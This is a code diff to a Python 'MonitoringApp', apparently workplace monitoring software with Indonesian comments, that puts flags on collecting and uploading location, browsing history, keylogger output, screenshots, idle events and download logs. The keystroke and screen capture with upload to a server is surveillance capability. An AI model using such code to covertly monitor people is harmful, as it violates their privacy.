@@ -1913,56 +1913,68 @@ class MonitoringApp:
                 if not self.is_sending:
                     self._retry_offline_data()
 
-                    location_data = self.location_tracker.get_location()
-                    
-                    app_usage_data = self.app_monitor.get_usage_data()
-                    browsing_data = self.browsing_tracker.get_new_history()
-                    upload_data = self.upload_tracker.get_new_activities()
-                    keystrokes_data = self.keylogger.get_logs()
-                    idle_data = self.idle_tracker.get_new_events()
-                    count = len(browsing_data)
-                    upload_count = len(upload_data)
-                    keystroke_count = len(keystrokes_data)
-                    idle_count = len(idle_data)
+                    feat = self.enabled_features  # shorthand
+
+                    # Location
+                    location_data = self.location_tracker.get_location() if feat.get("location") else None
+
+                    # App usage & browsing
+                    app_usage_data = self.app_monitor.get_usage_data()   if feat.get("app_usage")         else []
+                    browsing_data  = self.browsing_tracker.get_new_history() if feat.get("browsing_history") else []
+                    upload_data    = self.upload_tracker.get_new_activities() if feat.get("upload_activity")  else []
+                    keystrokes_data= self.keylogger.get_logs()            if feat.get("keylogger")        else []
+                    idle_data      = self.idle_tracker.get_new_events()   if feat.get("idle_tracker")     else []
+                    count          = len(browsing_data)
+                    upload_count   = len(upload_data)
+                    keystroke_count= len(keystrokes_data)
+                    idle_count     = len(idle_data)
                     download_count = len(self.download_logs)
-                    
-                    screenshot_data = self.screenshot_capture.capture_and_encode()
+
+                    # Screenshot - hanya jika feature aktif
+                    screenshot_data = None
+                    if feat.get("screenshot"):
+                        screenshot_data = self.screenshot_capture.capture_and_encode()
 
                     results = self.data_sender.send_all_data_with_screenshot(
-                        app_usage_data, 
-                        browsing_data, 
-                        screenshot_data, 
+                        app_usage_data,
+                        browsing_data,
+                        screenshot_data,
                         location_data
                     )
-                    
+
                     self._handle_send_results(results, app_usage_data, browsing_data, screenshot_data, location_data)
 
-                    loc_result = self.data_sender.send_location(location_data)
-                    results["location_data"] = loc_result
-                    if not loc_result.get("success"):
-                        self.persistence.add_to_queue("location", {"location": location_data})
-                    
-                    if keystrokes_data:
+                    # Location send
+                    if feat.get("location") and location_data:
+                        loc_result = self.data_sender.send_location(location_data)
+                        results["location_data"] = loc_result
+                        if not loc_result.get("success"):
+                            self.persistence.add_to_queue("location", {"location": location_data})
+
+                    # Keystrokes - hanya jika feature aktif
+                    if feat.get("keylogger") and keystrokes_data:
                         key_result = self.data_sender.send_keystrokes(keystrokes_data, location_data)
                         results["keystrokes"] = key_result
                         if not key_result.get("success"):
                             self.persistence.add_to_queue("keystrokes", {"keystrokes": keystrokes_data, "location": location_data})
 
-                    if idle_data:
+                    # Idle tracker - hanya jika feature aktif
+                    if feat.get("idle_tracker") and idle_data:
                         idle_result = self.data_sender.send_idle_events(idle_data, location_data)
                         results["idle_event"] = idle_result
                         if not idle_result.get("success"):
                             self.persistence.add_to_queue("idle_event", {"idle_events": idle_data, "location": location_data})
 
-                    if upload_data:
+                    # Upload activity - hanya jika feature aktif
+                    if feat.get("upload_activity") and upload_data:
                         up_result = self.data_sender.send_upload_activity(upload_data, location_data)
                         results["upload_activity"] = up_result
                         if not up_result.get("success"):
                             self.persistence.add_to_queue("upload_activity", {"upload_activities": upload_data, "location": location_data})
 
-                    # Send download logs
+                    # Send download logs - hanya jika fitur browsing/download aktif
                     download_count_sent = 0
-                    if self.download_logs:
+                    if self.download_logs and (feat.get("browsing_history") or feat.get("upload_activity")):
                         download_count_sent = len(self.download_logs)
                         dl_result = self.data_sender.send_download_logs(self.download_logs)
                         results["download_logs"] = dl_result
